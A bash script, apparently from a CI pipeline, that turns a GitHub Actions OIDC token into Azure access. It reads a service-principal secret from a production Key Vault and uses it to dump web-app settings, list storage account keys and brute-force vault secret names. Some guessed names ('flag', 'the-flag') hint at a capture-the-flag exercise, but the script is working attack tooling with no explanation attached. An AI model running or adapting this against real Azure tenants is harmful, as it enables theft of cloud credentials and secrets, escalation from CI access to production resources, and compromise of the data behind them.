#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net/secrets"

J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
oidc(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=$1" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
VT=$(oidc https://vault.azure.net/.default)
js=$(curl -sS "$PROD/reporting-service-principal?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
cid=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("appId") or d.get("clientId") or "")')
scx=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("clientSecret") or d.get("password") or "")')
RARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$cid" -d grant_type=client_credentials --data-urlencode "client_secret=$scx" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')

echo "### app settings via ARM (reporting-service)"
for site in "rg-tbl-reporting-prod-eus/app-tbl-reporting-prod" "rg-tbl-platform-prod-sea/app-tbl-storefront-prod"; do
  rg=${site%%/*}; ap=${site##*/}; echo "-- $ap"
  curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$rg/providers/Microsoft.Web/sites/$ap/config/appsettings/list?api-version=2023-01-01" -H "Authorization: Bearer $RARM" | python3 -c 'import sys,json
s=sys.stdin.read()
try:
 p=json.loads(s).get("properties",{})
 for k,v in p.items(): print("   ",k,"=",(v[:160] if isinstance(v,str) else v))
except Exception: print("   ",s[:200])'
done

echo "### listKeys storage (reporting-service)"
for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
  echo "-- $sa: $(curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" -H "Authorization: Bearer $RARM" | tr -d '\n' | head -c 160)"
done

echo "### kv-tbl-prod guessed secrets (72ff278a GET)"
for n in config-storage-connection storage-connection storage-connection-string appcfg-connection backup-connection config-storage storage-account-key appcfg-key sttblappcfgprodx3euoz sttblbackupprodx3euoz storage flag the-flag; do
  code=$(curl -sS -o /dev/null -w '%{http_code}' "$PROD/$n?api-version=7.4" -H "Authorization: Bearer $VT")
  [ "$code" = "200" ] && echo "-- FOUND $n: $(curl -sS "$PROD/$n?api-version=7.4" -H "Authorization: Bearer $VT" | head -c 400 | base64 -w0)" || echo "-- $n: $code"
done
echo END
